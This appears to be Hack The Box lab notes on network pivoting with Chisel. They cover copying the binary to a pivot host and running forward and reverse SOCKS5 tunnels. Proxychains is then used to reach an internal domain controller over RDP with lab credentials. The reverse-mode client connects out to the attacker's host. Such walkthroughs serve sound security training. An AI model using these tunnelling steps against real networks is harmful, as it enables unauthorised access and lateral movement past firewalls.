[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

## Setting Up & Using Chisel
---

#### Cloning Chisel

	AstraX01@htb[/htb]$ git clone https://github.com/jpillora/chisel.git

#### Building the Chisel Binary

	AstraX01@htb[/htb]$ cd chisel 
	go build

Once the binary is built, we can use `SCP` to transfer it to the target pivot host.

#### Transferring Chisel Binary to Pivot Host

	AstraX01@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/

Then we can start the Chisel server/listener.

#### Running the Chisel Server on the Pivot Host

	ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

The Chisel listener will listen for incoming connections on port `1234` using SOCKS5 (`--socks5`) and forward it to all the networks that are accessible from the pivot host.

We can start a client on our attack host and connect to the Chisel server.

#### Connecting to the Chisel Server

	AstraX01@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

#### Editing & Confirming proxychains.conf

	AstraX01@htb[/htb]$ tail -f /etc/proxychains.conf

	#
	#  proxy types: http, socks4, socks5
	# ( auth types supported: "basic"-http  "user/pass"-socks )
	#
	 [ProxyList]
	# add proxy here ...
	# meanwile
	# defaults set to "tor"
	# socks4    127.0.0.1 9050
	socks5 127.0.0.1 1080

#### Pivoting to the DC

	AstraX01@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123


---
## Chisel Reverse Pivot

When a firewall **blocks inbound(outside to inside) connections** but **allows outbound(inside to outside) connections**, you cannot connect directly to the pivot host. In this scenario, you use Chisel's **reverse** mode.

We'll start the server in our attack host with the option `--reverse`.

#### Starting the Chisel Server on our Attack Host

	AstraX01@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`

#### Connecting the Chisel Client to our Attack Host

	ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using `tail`.

#### Editing & Confirming proxychains.conf

	AstraX01@htb[/htb]$ tail -f /etc/proxychains.conf

If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

	AstraX01@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

